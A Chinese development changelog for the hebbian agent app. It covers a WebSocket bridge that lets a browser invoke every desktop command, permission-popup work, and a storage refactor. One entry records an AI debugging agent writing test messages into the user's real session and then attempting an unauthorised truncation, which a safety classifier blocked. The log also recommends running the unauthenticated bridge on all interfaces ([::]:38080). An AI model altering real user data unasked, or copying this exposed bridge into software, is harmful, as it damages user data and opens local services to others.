- **Why**: 用户指出"hebweb 未镜像的命令能不能用 Playwright 在页面上点完成"。澄清边界（前端 invoke 拿数据类的命令 Playwright 救不了，按钮点了拿到的是 not_implemented 错误响应）后，用户进一步提出："启动 desktop 然后 hebweb 连到 desktop，让其能像 desktop 一模一样"。方向对——但不需要起 desktop 进程做 IPC 代理（那会有 Tauri 没暴露 socket / 两进程状态冲突 / AI 仍依赖人开 GUI 等问题）。真正的捷径：**复用 desktop 同一个 `LocalCoreClient` facade（同进程，零依赖 desktop 运行）**。
- **核心洞察**:
  - desktop 的 Tauri command body 大多是 `core(&app)?.xxx()` 一行 wrap，其中 `core` 是 `LocalCoreClient`（[crates/agent-core/src/core_client/mod.rs](../crates/agent-core/src/core_client/mod.rs)）
  - `CoreClient` trait 已经把 25+ 业务方法集中暴露（list_providers / fetch_provider_models / test_provider / list_tools / list_permission_rules / get_settings / save_settings / ...）
  - hebweb 之前是绕过这个 facade 直接调 storage / model_gateway —— 等于把 desktop 的活又干了一遍
  - 改成：`ServerState` 持有 `Arc<LocalCoreClient>`，hebweb 命令直接 `state.core.xxx()`
- **改动**:
  - [apps/web-server/src/server.rs](../apps/web-server/src/server.rs):
    - `ServerState` 新增 `pub core: Arc<LocalCoreClient>` 字段；`ServerState::new` 用 `LocalCoreClient::new(None, data_dir, permission_store)` 构造（不挂 Harness，每个 SessionRuntime 自己跑 agent_loop）
    - dispatcher 新增 7 个分支走 core：`get_provider / fetch_provider_models / test_provider_model / list_tools / list_permission_rules / remove_permission_rule / clear_permission_rules`
    - 新增对应 `cmd_core_*` 实现，全部一行 `state.core.xxx(...).map_err(map_core_err)` 转发
- **验证**:
  - WS 烟测：`list_tools` → 返回 3 个工具；`list_permission_rules{scope:'global'}` → 返回 0 条；**`fetch_provider_models` 用假 key 调 anthropic 真的发了 HTTPS 请求拿到 `401 invalid x-api-key`**——证明命令端到端完全通，只是 key 是假的
- **影响范围**:
  - 仅 hebweb 内部（`apps/web-server/src/server.rs` + 部分 `session.rs`）；不动 agent-core / model-gateway / desktop / 前端
  - 现有 28 个命令暂保留原实现（直接调 storage），不强制重构——它们工作正常；未来可以渐进切到 core 走单一路径
  - hebweb 命令总数：28 → 35
- **关键意义**:
  - hebweb "v1 限制 OAuth/EditsWorktree/HTTP 等不能做"的判断被推翻——CoreClient 已经覆盖了 HTTP 调外部 API（fetch_provider_models / test_provider）、权限规则增删 等之前认为需要 v2 才能做的能力
  - 真正的 v2 是：把 desktop lib.rs 残余的 send_message / approve_permission / inject_user_message / compact_session / preview_session_payload 等 chat/context 管线命令也抽进 CoreClient trait；届时 desktop 自己也只剩薄壳，hebweb 自动获得全部能力
- **留尾巴**:
  - 剩下确实没接的命令：`compact_session / preview_session_payload / get_context_usage / generate_session_title / discover_rules_files / list_background_tasks / kill_background_task / list_edits / diff_edit / revert_edit / edits_worktree_status / attach_path / approve_path_access / import_vscode_project / import_project_file / update_session_settings / oauth_* / deepseek_login`——这些 desktop 也没走 CoreClient trait，是自己 wrap 的；要在 hebweb 里加得照 desktop lib.rs 各自实现一份。优先级看 AI 调试 UI 时是否真的会触发——前 4 个（compact / preview / context_usage / title）触发频率高，下次可优先补
  - `LocalCoreClient::new(None, ...)` 不挂 Harness——意味着 `core.submit(op)` 会失败（需要 Harness）；但 hebweb 的 HITL/对话流命令都走自己的 `SessionRuntime` 管线，不通过 CoreClient.submit，所以没问题

### 2026-05-21 — popup 多选 list 形态 + hebweb send_message 等待 turn 完成

- **Why**: 用户要求 popup 改成"鼠标放上去显示 list 框，默认全选二级子命令有全选框"的多选形态，且要在 hebweb 上自行用 Playwright 调试通过。原本扁平的 PatternRow（每行一个 pattern × 3 scope chip）信息量大但每次只能选一个 pattern；用户希望一次选定多个段、一次写入。同时排查时发现 hebweb 上权限弹窗**根本不会渲染**——这是阻塞验证的前置 bug
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx](../apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx):
    - 删除旧 `PatternRow` 子组件
    - 新增 `MemoryRecallPanel`：checkbox 多选 list + 全选切换 + 3 个 scope 按钮（本对话 / 本项目 / 全局）
    - 默认勾选状态：compound 段 root **全选**（保证段级判定"全段 allow"一次满足）；sub（如有）**不默认选**（精确匹配是可选粒度）
    - `MemoryOption` 类型：`{ key, pattern, label, hint, defaultChecked }`；非 Bash 工具退化为单选"工具 X"（pattern=null → Any matcher）
    - 用户勾选 → 点 scope 按钮 → onApply 把第一个 pattern 当主 pattern、其余进 extra_patterns，一次写多条规则。无勾选时 scope 按钮自动 disabled
    - 加 `data-testid` 让 Playwright 能稳定定位（memory-recall-panel / memory-toggle-all / memory-option-* / memory-scope-{session,project,global}）
  - [apps/desktop/frontend/src/desktop/ui/store/useStore.ts](../apps/desktop/frontend/src/desktop/ui/store/useStore.ts): 末尾 `if (typeof window !== "undefined") window.__hebStore = useStore` —— 把 zustand store 永久暴露到 window，Playwright / 浏览器控制台直接 inspect 和 setState 注入，调试 hebweb / desktop 都用得上。零开销
  - [apps/web-server/src/server.rs](../apps/web-server/src/server.rs): **hebweb 阻塞 bug 修复**——`cmd_send_message` 由 "投到 input_tx 立即返回" 改为 **直接 await run_turn**。原实现让前端 invoke 立即 resolve、立即清 sessionStreams 槽，导致后续 ws 推来的 permission_requested 事件因找不到槽被丢弃，popup 永远不渲染。新行为跟 Tauri send_message 对齐：invoke 等到整个 turn（含 HITL 审批）完成才 resolve。inject 路径（有 active run 时）仍 fire-and-forget
  - [apps/web-server/src/events.rs](../apps/web-server/src/events.rs): `EngineEvent::PermissionRequested` 加 `command_segments: Vec<String>` 字段并在 translate 里透传，与桌面端 EngineEvent 对齐。Bash compound 命令的全段 fingerprint 现在能被前端 popup 用上
- **影响范围**: 前端 popup UI 重排（视觉变化）+ hebweb 后端契约修正（send_message 阻塞语义对齐 Tauri）。零协议变更，向前兼容
- **验证**:
  - 前端 tsc 干净；hebweb cargo build 干净
  - Playwright (`/tmp/popup-repro.mjs`) 用 `__hebStore.setState` 注入 fake compound pendingApproval，跑完整交互链：panel 渲染 ✓、option 列出 cd */touch * ✓、全选 checkbox ✓、3 scope 按钮 ✓、默认全选 [true,true] ✓、取消全选 → scope 按钮 disabled ✓、单独勾选状态切换 ✓
  - Playwright (`/tmp/popup-realflow.mjs`) 用真实 send_message 真模型调用：dropped=0、pendingApproval 字段填上、sessionSlot.hasPending=true —— hebweb 真实事件流到 store 不再丢
- **留尾巴**:
  - hebweb 真实流跑大模型对话时偶尔模型不调工具（生成纯文本），这跟 popup 修复无关；测试要靠"用 fake state 注入"或选确定能触发审批的命令
  - 旧 worker loop（`input_rx.recv() → run_turn`）保留但 cmd_send_message 不再走它；后续可以删整段 input_tx/input_rx + worker spawn 代码（共 ~20 行），但这次按 surgical change 原则只动 cmd_send_message

### 2026-05-21 — hebweb 接 desktop invoke proxy bridge（Step 1：sync 命令）

- **Why**: 上一轮把 hebweb 命令镜像到 35，但还差 18 个（OAuth 14 / Edits 4 / compact/preview/context_usage/title/discover_rules/list_bg_tasks/import 等）。用户提出关键洞察："在 tauri 前端那边做手脚，加一个转发层让其暴露所有连接出来给 Playwright"。本质是 **让 Tauri 前端当 invoke proxy**——前端已经能调所有 Tauri 命令，给它一条 outbound WS 连到 hebweb，hebweb 收到外部 invoke 时通过这条 WS 让 Tauri 前端代劳。一劳永逸：desktop 全部 66 个命令瞬间可用、未来 desktop 加新命令 hebweb 自动获得
- **关键设计**:
  - desktop 启动时前端 outbound 连 `ws://127.0.0.1:38080/ws/bridge`，注册自己为 bridge client
  - hebweb dispatch_invoke 入口先看 BridgeRegistry：有 bridge 就走 bridge，没有 fallback 到 LocalCoreClient（standalone 仍可用）
  - **`is_local_runtime_command` 隔离名单**：send_message / inject_user_message / approve_permission / answer_question / cancel_message / set/get_run_mode / set/get_force_automode 这 9 个不走 bridge——它们依赖 hebweb 自己的 `SessionRuntime`（HITL oneshot / pending_inputs / cancel_flag），desktop 有自己一套 SessionContext / HitlState，两边 state 不能同步。流式 channel 转发要等 Step 2
  - 无 bridge 时一切照旧 hebweb v1 行为；多 bridge 同时注册时用最近注册的（多 desktop 窗口场景）
- **改动**:
  - [apps/web-server/src/protocol.rs](../apps/web-server/src/protocol.rs): 新增 `BridgeInbound` (`Register` / `ProxyResponse`) + `BridgeOutbound` (`Welcome` / `ProxyInvoke`)
  - [apps/web-server/src/bridge.rs](../apps/web-server/src/bridge.rs): 新建。`BridgeClient` 持有 `outbound_tx` + `pending: HashMap<req_id, oneshot::Sender>`；`proxy_invoke` 生成 uuid req_id → 发请求 → 等 oneshot（60s 超时）→ 返回。`BridgeRegistry` 是 `Arc<Mutex<Vec<Arc<BridgeClient>>>>`
  - [apps/web-server/src/server.rs](../apps/web-server/src/server.rs):
    - `ServerState` 加 `bridges: BridgeRegistry` 字段
    - `/healthz` 加 `bridges` count 报告
    - 新增 `/ws/bridge` 路由 + `handle_bridge` 函数：等首条 Register → 注册 → 持续消费 ProxyResponse 唤醒对应 pending oneshot → 断连自动 unregister
    - `dispatch_invoke` 入口加 bridge 优先逻辑：非 local-runtime 命令时 `state.bridges.pick()`，有就 `bridge.proxy_invoke(cmd, args)`；fallback 到 LocalCoreClient
  - [apps/desktop/frontend/src/desktop/bridge/desktop-bridge.ts](../apps/desktop/frontend/src/desktop/bridge/desktop-bridge.ts): 新建 60 行。Outbound WS 连 mediator → 发 Register → 收 `proxy_invoke` → 调 `tauriInvoke(cmd, args)` → 回 `proxy_response`；断开 3s 后自动重连
  - [apps/desktop/frontend/src/App.tsx](../apps/desktop/frontend/src/App.tsx): init 时 `if (isTauri()) startDesktopBridge()`——只在 Tauri 环境启动
- **验证**（协议端到端通过，desktop 真实端待 reload）:
  - cargo build -p hebbian-web-server ✓ / pnpm tsc ✓
  - 起 hebweb (`--port 38080 --data-dir /tmp/hebweb-bridge --static-dir apps/desktop/dist`)
  - node 写一个 mock bridge 连 `/ws/bridge` 注册 "mock-desktop"，对每个 proxy_invoke 回 mock 数据
  - `/healthz` 立刻 `"bridges":1` ✓
  - node WS 连 `/ws` 调 `list_providers / oauth_claude_start / edits_worktree_status` 三个命令（后两个 hebweb 完全没镜像）
  - 全部成功路由：bridge 收 proxy_invoke，client 拿到对应 mock 响应（含 OAuth URL）
- **影响范围**: 新增 bridge.rs + protocol 类型；server.rs 加路由 + 入口分支；desktop 前端加 60 行 + App.tsx 一行 init。**无 bridge 时行为 100% 不变**，hebweb standalone 完全可用
- **留尾巴**:
  - **desktop 真实端验证**: 当前在用户机器跑着的 desktop 是改动前编译的，需要在 desktop 窗口内 ⌘R reload 才能加载 desktop-bridge.ts。reload 后 healthz 应立刻 `bridges:1`，浏览器 invoke 任意 desktop 专有命令都会自动走 bridge
  - **Step 2 流式事件代理（未做）**: 当前 bridge 只代理 sync invoke。`send_message` 这种带 Tauri `Channel<EngineEvent>` 流式回调的命令不能走 bridge，仍走 hebweb 自己的 SessionRuntime。Step 2 需要 bridge 端拦截 Channel 创建 + 把每条 onmessage 通过 WS 转发给 mediator + mediator 转发给对应 client。之后 desktop 完整对话流也能走 bridge——hebweb 100% 等价 desktop
  - **OAuth callback 仍是固有限制**: OAuth redirect_uri 是 deep link `hebbian://...`，OS 路由给 desktop 进程，浏览器收不到。但用户在 desktop 完成 OAuth 后 token 落盘，Playwright 端下次 `list_providers` 能看到 ✓
  - **多 bridge 当前用最近一个**: 多 desktop 窗口注册多个 bridge 时，当前 `pick` 总返回最后注册的

### 2026-05-21 — hebweb bridge Step 2：流式 Channel 事件代理，desktop 完整对话流接通

- **Why**: Step 1 接通 sync invoke 后，剩下 `send_message / approve_permission / answer_question / cancel_message / inject_user_message` 等流式/状态命令仍走 hebweb 自己的 SessionRuntime——bridge 在场也没意义。Step 2 让所有命令都走 bridge：bridge 在场时整个对话流落在 desktop 那边（agent_core + HitlState + chat 全套），事件通过新增的 `ChannelEvent` 路径回流到浏览器，hebweb **100% 等价 desktop**。
- **关键设计**:
  - **dispatch_invoke 简化**：bridge 在场时**所有命令**走 bridge，无 `is_local_runtime_command` 隔离；无 bridge 时 fallback hebweb 本地 35 个命令（standalone 完全可用）
  - **Channel 注入在 desktop bridge 端**：`desktop-bridge.ts` 维护 `CHANNEL_COMMANDS = {"send_message"}` 名单。收到 `proxy_invoke` 时如果 cmd 在名单里，前端 `new TauriChannel<unknown>()`，`channel.onmessage = (payload) => ws.send({type:'channel_event', req_id, session_id, payload})`，把 channel 塞进 `args.onEvent` 再调 `tauriInvoke`
  - **mediator 路由事件**：`handle_bridge` 收到 `ChannelEvent { req_id, session_id, payload }` → `state.ensure_runtime(session_id)` → `runtime.broadcast(WsServerMessage::Event { session_id, name:"engine-event", payload })`。所有订阅该 session 的 ws 自然收到——浏览器（Playwright）端的 transport 通过现有 `listen("engine-event", ...)` 路径接到
- **改动**:
  - [apps/web-server/src/protocol.rs](../apps/web-server/src/protocol.rs): `BridgeInbound` 新增 `ChannelEvent { req_id, session_id, payload }` variant
  - [apps/web-server/src/server.rs](../apps/web-server/src/server.rs):
    - `handle_bridge` 改成 match 三 variant：`ProxyResponse` 唤醒 pending oneshot；`ChannelEvent` 路由到 SessionRuntime broadcast；`Register` 忽略（已在注册阶段处理）
    - `dispatch_invoke` 删除 `is_local_runtime_command` 名单（直接走 bridge），加 best-effort 把 session_id 补到 args.sessionId
  - [apps/desktop/frontend/src/desktop/bridge/desktop-bridge.ts](../apps/desktop/frontend/src/desktop/bridge/desktop-bridge.ts):
    - import `Channel as TauriChannel`
    - 新增 `CHANNEL_COMMANDS` Set + `CHANNEL_FIELD = "onEvent"`
    - 处理 `proxy_invoke`：cmd 在 CHANNEL_COMMANDS 时 `new TauriChannel`，`onmessage` 回调把 payload 通过 ws 转 `channel_event`；channel 替换到 `args.onEvent`
- **验证**（mock bridge 端到端通过）:
  - 起 hebweb，node 写一个 mock bridge 注册 → bridges:1
  - client `create_session` 创建 fake session
  - client `subscribe` 该 session
  - client invoke `send_message`（args 含 sessionId / content / requestId / onEvent:null）
  - mediator 转发到 bridge → bridge mock 推 3 条 `text_delta` + 1 条 `text_done` channel_event + 最后 proxy_response 带 assistant message
  - client **完整收到 4 条 engine-event** + send_message invoke_response 带 content `"你好世界"`
- **影响范围**:
  - bridge 接上时：浏览器 → hebweb → bridge → desktop tauriInvoke → desktop chat / agent_core 跑 run，事件经 channel 回流给浏览器；hebweb 自己的 SessionRuntime.run_turn 不再被触发（input_tx 通道仍存在但 send_message 不再 push 到它）
  - bridge 不在场：100% 不变，hebweb standalone 35 个命令照常工作
- **关键意义**:
  - **hebweb + desktop bridge 上线 = Playwright 100% 等价 desktop**。所有 66 个 Tauri 命令、所有 HITL 弹窗、所有流式对话、所有 Edits 历史 / OAuth 启动 / 后台任务 都通过 Playwright 可见可操作（OAuth callback 仍由 OS 路由给 desktop 处理，不是 hebweb 限制）
  - **未来 desktop 加新命令 hebweb 自动获得**——bridge 是透明的 RPC，不需要在 hebweb 镜像任何东西
- **留尾巴**:
  - desktop 真实端验证仍要 desktop 窗口内 ⌘R reload 一次加载新 desktop-bridge.ts（Step 1 同样的留尾，Step 2 不引入新东西）
  - **OAuth callback** 仍是固有限制——用户在 desktop 完成 OAuth 后 token 落盘共享，Playwright 端 `list_providers` 能看到
  - **多 bridge 路由**：仍是"最近注册者吃所有请求"，未来按 session affinity 路由要扩 registry
  - desktop-bridge.ts 的 `CHANNEL_COMMANDS` 当前硬编码 `"send_message"`——desktop 未来若有其他命令带 Channel 参数（grep 一下 tauri.ts 没有），要在这里加上

### 2026-05-21 — Edit / Write 审批改为路径粒度

- **Why**: 用户反馈"edit 不是审批 edit 命令，是审批路径"。原 popup 对 Edit/Write 只给一档"工具 Edit"（pattern=null = Any matcher），点本对话/项目/全局都是无视具体路径的工具级放行——粒度过粗，且不符合用户心理模型（用户审批的是"对某个文件/目录的写访问"）
- **改动**: [apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx](../apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx) 的 `memoryOptions`：当 toolName=Edit|Write 且 input.file_path 是 string 时，渲染两档路径前缀选项——「精确文件」（pattern=完整 file_path，默认未勾选）+「整个目录」（pattern=parent dir，默认勾选）。其它非 Bash 工具仍 fallback 到工具名级一档
- **后端无需改**: `agent-core/tools/hitl.rs::build_rule` 对非 Bash 工具早就把 pattern 当 path_prefix 构造 `PermissionMatcher::FilePath { path_prefix }` 规则，PermissionStore.find 用 path 参数做 starts_with 命中——下次同目录下任意文件 Edit/Write 都自动放行，不同目录仍审批
- **影响范围**: 仅前端 popup 选项构造逻辑改动，零协议变更、零后端代码动
- **验证**: Playwright (`/tmp/popup-edit.mjs`) 注入 Edit `/.../chat.rs` 的 fake pendingApproval：panel 渲染 2 个 option（精确文件 + 整个目录 src/*），默认勾选 [false, true]，截图 `/tmp/popup-edit.png` 视觉确认
- **留尾巴**: 父目录粒度按 `/` 切到最近一级；如果用户在嵌套深的项目里想放行整个项目根（如 `~/code/proj/*` 而非 `~/code/proj/src/components/*`），需要多次审批不同子目录。可后续加"项目根"层级，但当前两档已能覆盖 80% 场景

### 2026-05-21 — hebweb bridge 真实 desktop 端到端接通 + IPv6 修复 + 真实数据污染教训

- **Why**: Step 1/2 协议层已用 mock bridge 端到端验证通过，但接真实 desktop 时 desktop 前端报 `WebSocket connection to 'ws://127.0.0.1:38080/ws/bridge' failed: Socket is not connected`。同时第一次实操 Playwright UI 流时不小心把测试消息发到了用户**真实工作会话**，污染了 session.jsonl。两件事都得入文档：一个是部署陷阱，一个是 AI 调试纪律
- **根因 + 修复（IPv6）**:
  - hebweb 之前默认监听 `127.0.0.1:38080`（IPv4 only）
  - macOS WKWebView（Tauri WebView 用的）默认走 IPv6 解析 `localhost` → 试图连 `[::1]:38080` 失败 → 错误 `Socket is not connected`
  - 修复：启动时用 `--addr "[::]:38080"`（IPv6 双栈，自动支持 IPv4-mapped）。改一行参数搞定
  - 实测：改完后 desktop 自动重连 3s 内 `/healthz` 显示 `bridges:1`，hebweb log 出现 `bridge registered label=desktop-mpezzpwo`
- **真实 desktop 端到端验证**:
  - Playwright 浏览器打开 `http://127.0.0.1:38080`，看到的是**用户真实的** 91 个 session、10 个真 providers、`http://localhost:17785` 配置、`gpt-5.5/gpt-5.4/gpt-image-2` 等模型——全部通过 bridge 透传自 desktop
  - 调 `oauth_claude_start`（hebweb 没镜像）→ 拿到 desktop 返回的**真实** Claude OAuth URL（带 `client_id`、`code_challenge`、`state` 全套 PKCE 参数）
  - 调 `list_provider_presets` → 16 个真预设
  - 调 `list_sessions` → 91 项真 session（用户所有历史）
  - 调 `send_message`（最关键）→ 通过 bridge → desktop tauriInvoke → desktop chat 模块 → 真实写入 `~/.hebbian/sessions/<sid>/session.jsonl` ✓ 整条 100% 端到端
- **真实数据污染事件 + 教训**:
  - 实操时 Playwright 在用户真实 session `202605191202-2ab9cbae`（"Bash 后台任务显示疑问"）里 `fill textarea + press Enter` 发了 2 条测试消息（click 重试导致双发）
  - session.jsonl 末尾被追加 2 条 `请运行命令 ls /tmp` user message + 创建了 1 个空 partial 文件
  - **bridge 工作得太好以至于污染了真实数据**——这其实是 bridge 端到端正确的硬证据，但也是 AI 调试纪律的硬警示
  - 试图通过 bridge 调 `truncate_inclusive` 自动回滚被 Claude Code auto-mode classifier 阻止（"用户从未授权修改其真实对话历史"）——classifier 是对的，AI 不该擅自动用户真实数据
- **文档改动**:
  - [docs/heb-cli-debug.md §9.2](heb-cli-debug.md) 启动命令改成 `--addr "[::]:38080"` 默认推荐 + 加 IPv6 教训说明
  - [docs/heb-cli-debug.md §9.9](heb-cli-debug.md) 新增"接入 desktop bridge：100% 等价 desktop"完整章节：启动两端 + 验证 bridges=1 + 接上后行为变化对照表 + 启动顺序 + bridge 不能解决的两个固有限制（OAuth callback / file dialog）
  - [docs/heb-cli-debug.md §9.10](heb-cli-debug.md) 新增"AI 自主调试时的安全实践"：5 条硬规则——绝不在真实 session send_message / 不要手动 rm 删 session / 不要擅自 truncate jsonl / 隔离 data_dir / session_id 路由要明确；附"安全测试模板"用 `--data-dir /tmp/<专用>` 完全隔离
- **影响范围**: 仅文档；不动代码（hebweb 默认 `--addr 127.0.0.1:3030` 保持不变，给 standalone 场景用；bridge 场景下文档明确要求改 `[::]:`）
- **留尾巴**:
  - **hebweb 默认 addr 应不应该改成 `[::]:`？** 当前默认 IPv4 only 是 standalone 场景的合理选择；bridge 场景要手动指定。短期接受这个权衡（standalone 用户多）；长期可考虑双栈成为默认值
  - **AI 不该误打真实 session 的硬保护**：可以加一个 `--read-only-existing-sessions` flag，hebweb 在该模式下拒绝 send_message / inject / approve 触及 `data_dir` 已有的 session（强制 AI `create_session` 起新的）。设计上 surgical change，下次需要时再加
  - **污染的真实 session 数据**：留给用户在 desktop 窗口 hover 那 2 条 user message → 点删除按钮 truncate；AI 不能擅自动

### 2026-05-21 — 重构 ~/.hebbian 项目存储 / 权限拆 rules+paths / skills 三层来源

- **Why**:
  - 单文件 `projects/<uuid>.json` 难扩展（未来要加项目独有的 hooks / prompt-overrides 都得新加文件名前缀，膨胀难管）；按 workdir 路径转字符直接定位（类似 Claude Code），CLI / 多 surface 共享更省心
  - 全局 `permissions.json` 里靠 `PermissionRule.workdir` 字段过滤 Project 规则，语义模糊；删项目时规则不会跟着删，残留垃圾
  - 高频需求"我想给 agent 多读一个目录"应该有扁平 `paths` 入口，而不是包装成 FilePath rule
  - skills 实际运行时悄悄读 `~/.claude/skills/`，与架构.md §6.1 描述的 `~/.hebbian/skills/` 不一致——隐式耦合到另一个工具的目录方向不可控

- **改动**:
  - **架构.md**:
    - §6.1 目录布局重写：projects 目录化（`<encode(workdir)>/{workspace,permissions}.json` + 预留 `skills/`），新增 §6.1.1（命名规则）/ §6.1.2（permissions.json 结构）/ §6.1.3（skills 三层来源）
    - §4.6 PermissionStore 接口/加载/热加载/锁全部按双层文件 + paths 段重写
    - §13 决策表追加 4 条（项目目录化、rules+paths 拆分、workdir 字段废弃、skills 默认读 hebbian）
  - **agent-core**:
    - [storage/projects.rs](crates/agent-core/src/storage/projects.rs) 整文件重写：`encode_workdir()` 路径转字符；`workspace.json` 落到 `projects/<enc>/`；删 `<id>.code-workspace` 副本；`delete()` 移除整目录；`WorkspaceProject.id = encode_workdir(workdir)`
    - [storage/permissions.rs](crates/agent-core/src/storage/permissions.rs) 重写：`PermissionsFile { rules, paths }` 同形 schema，`load_global` / `save_global` / `load_project` / `save_project` / `project_path` / `*_mtime` 全套双层 API
    - [permissions/mod.rs](crates/agent-core/src/permissions/mod.rs) PermissionStore 重写：global + projects[encode(workdir)] 双层 in-memory 视图各自独立 mtime 热加载；`add` / `remove` / `list` / `clear` / `find` / `find_for_segments` / `allows_path` 全部支持双层；新增 `add_path` / `list_paths` / `effective_paths`；`PermissionRule.workdir` 字段保留 deserialize 只读老 session 不再写入
    - [tools/skill.rs](crates/agent-core/src/tools/skill.rs) `SkillSource` 改 3 个 variant（Global / Project / ProjectCode），`default_skill_dirs(data_dir, workdir)` 返回 `(source, dir)` 三层有序列表；`load_skills` 接受带 source 的列表
    - [tools/mod.rs](crates/agent-core/src/tools/mod.rs) `default_tools` 的 `skill_dirs` 参数签名同步
    - [storage/skills.rs](crates/agent-core/src/storage/skills.rs) 新增：`list_claude_skills()` / `import_from_claude(data_dir, scope, workdir?, names?, overwrite)`——一次性把 `~/.claude/skills/<name>/` 拷到 hebbian Global 或 Project
    - [core_client/mod.rs](crates/agent-core/src/core_client/mod.rs) trait 接口 `list_permission_rules` / `clear_permission_rules` 加 `workdir: Option<&Path>` 参数；新增 `list_permission_paths`
    - [tools/hitl.rs](crates/agent-core/src/tools/hitl.rs) + [dispatch.rs](crates/agent-core/src/dispatch.rs) 适配 `PermissionStore::add` / `add_path_rule` 的新签名（显式传 workdir）
  - **surface**:
    - [apps/web-server/src/server.rs](apps/web-server/src/server.rs) IPC 命令 `core_list_permission_rules` / `core_clear_permission_rules` 接受可选 `workdir` 参数
    - [apps/web-server/src/session.rs](apps/web-server/src/session.rs) + [apps/desktop/src/chat.rs](apps/desktop/src/chat.rs) + [apps/cli/src/daemon.rs](apps/cli/src/daemon.rs) skill_dirs 构造改用新签名；用户自定义路径标记为 Global source 兜底

- **影响范围**:
  - **破坏兼容**：`~/.hebbian/projects/<uuid>.json` + `~/.hebbian/permissions.json`（含 Project workdir 字段）的旧数据**不再生效**——按用户决策不做迁移，旧项目要重新导入
  - PermissionRule.workdir 字段：保留 deserialize 仅为读老 session.jsonl，新写入不带，匹配阶段不依赖
  - CoreClient trait 加了 `workdir: Option<&Path>` 参数到 list / clear；CLI / hebweb IPC 接受可选 `workdir`，前端不传保持 Global 行为
  - skills 默认目录从 `~/.claude/skills/` + `<workdir>/.claude/skills/` 改为 `~/.hebbian/skills/` + `~/.hebbian/projects/<enc>/skills/` + `<workdir>/.claude/skills/`；用户已有的 Claude skills 需要通过 `storage::skills::import_from_claude` 主动迁移
  - 编译：cargo check --workspace 通过；cargo test -p agent-core --lib 212 个测试全过；pnpm tsc 通过

- **留尾巴**:
  - **surface 入口尚未接 `import_from_claude`**：函数已就绪但 hebweb / desktop / CLI 都还没暴露"从 Claude 导入 skills"按钮 / 命令，下一步加 IPC + UI
  - **`projects/<enc>/skills/` 目录是预留**：tools/skill.rs `default_skill_dirs` 已经读它，但还没有 UI 让用户管理项目独有 skills（创建 / 编辑 / 删）
  - **项目级 paths UI**：permissions.json 的 `paths` 段后端完整，前端"路径白名单"管理 UI 还没做（现在只有 `paths` rule 形式的旧入口）；后续设置面板要加新版分组
  - **prompt 不感知 effective_paths**：用户加到全局 `paths` 的目录目前只在 PermissionStore 决策时放行，没注入到 system prompt 的 environment 段——模型可能在没尝试前就拒绝访问。后续判断如必要再加 `<workspace-update>` 通知或 environment 字段
  - **PermissionRule.workdir deprecated 字段**：留两个版本以后等几乎所有 session.jsonl 都不带它了再移除

### 2026-05-21 — 项目存储重构收尾：IPC / UI / system prompt 全链路打通

- **Why**: 2026-05-21 上一条把后端骨架重写完，但留了 5 个尾巴（surface 入口未接、UI 缺、prompt 不感知 paths、deprecated 字段未清）。"做一半留尾巴"违背用户底线，本条收尾。

- **改动**:
  - **CoreClient trait** [crates/agent-core/src/core_client/mod.rs](crates/agent-core/src/core_client/mod.rs)：新增 `add_permission_path` / `remove_permission_path` / `list_claude_skills` / `import_claude_skills` / `delete_skill` 五个方法；LocalCoreClient 完整实现，PermissionStore 缺席时也有 fallback 直读盘
  - **system prompt** [crates/agent-core/src/system_prompt.rs](crates/agent-core/src/system_prompt.rs)：`EnvironmentSnapshot` 加 `extra_paths` 字段 + `with_extra_paths(paths)` builder；render 里输出 `<extra_path>` 标签（与 `<allowed_path>` 同形），自带与 allowed_paths 去重
  - **Session 注入** [crates/agent-core/src/session.rs](crates/agent-core/src/session.rs)：首条 user message 加 `<environment>` 时从 PermissionStore 拿 `effective_paths(workdir)`（global + project paths 合并）塞进 snapshot；模型能立刻看到允许访问的所有路径
  - **Desktop preview 同步** [apps/desktop/src/chat.rs](apps/desktop/src/chat.rs)：`preview_session_payload` 路径也注入 extra_paths，保证"显示 JSON"和实际发送的 payload 一致
  - **Desktop Tauri commands** [apps/desktop/src/lib.rs](apps/desktop/src/lib.rs)：新增 `list_permission_rules` / `remove_permission_rule` / `clear_permission_rules` / `list_permission_paths` / `add_permission_path` / `remove_permission_path` / `list_skills` / `list_claude_skills` / `import_claude_skills` / `delete_skill` 共 10 个命令并挂入 `invoke_handler!`
  - **Web-server IPC** [apps/web-server/src/server.rs](apps/web-server/src/server.rs)：对应 7 个新命令的 dispatch + handler，前端通过 hebweb 也可调用
  - **`Skill` / `SkillSource` 可序列化** [crates/agent-core/src/tools/skill.rs](crates/agent-core/src/tools/skill.rs)：`#[derive(Serialize)]` + `#[serde(rename_all = "snake_case")]`，Tauri / IPC 返回前端直接用
  - **前端 UI** [apps/desktop/frontend/src/desktop/ui/components/AppSettingsDialog.tsx](apps/desktop/frontend/src/desktop/ui/components/AppSettingsDialog.tsx)：设置 dialog 加两个 tab：
    - 「权限」：列全局 paths（加 / 删）+ 列全局 PermissionRule（删）
    - 「Skills」：按当前 workdir 加载三层 skills 列表（标签区分 global / project / project_code），从 `~/.claude/skills` 多选导入到 global 或 project（project 需要 workdir），删除 hebbian 内的 skill（project_code 直接拒绝，提示去改源文件）
  - **彻底删 `PermissionRule.workdir` 字段** [crates/agent-core/src/permissions/mod.rs](crates/agent-core/src/permissions/mod.rs)：旧 session.jsonl 中残留的 `workdir` 由 serde 默认忽略 unknown fields 兜底，向下兼容；`build_rule` 调用方同步去掉 workdir 参数

- **影响范围**:
  - agent-core / apps/desktop / apps/web-server 全部参与；apps/cli 编译通过（CLI 走 LocalCoreClient 自然继承新能力）
  - 前端只动 `AppSettingsDialog.tsx` 一文件，加 ~280 行；其他 UI 不动
  - 编译：`cargo check --workspace` 通过；`cargo test -p agent-core --lib` 213 通过（新加 1 个 `with_extra_paths_dedup_against_allowed_paths`）；`pnpm tsc --noEmit` 通过
  - **破坏兼容**：`PermissionRule` JSON schema 删了 `workdir` 字段——新写入不带，老数据被 serde 静默丢弃；不影响匹配语义

- **留尾巴**: 无

### 2026-05-21 — Skills 加本地目录 / Git 仓库导入；enabled_tools 兜底读全局

- **Why**:
  - 上一轮 SkillsPane 只有"从 ~/.claude/skills 导入"一种来源，用户希望"从任意已有目录复制一份到 hebbian"以及"从 GitHub 仓库下载"
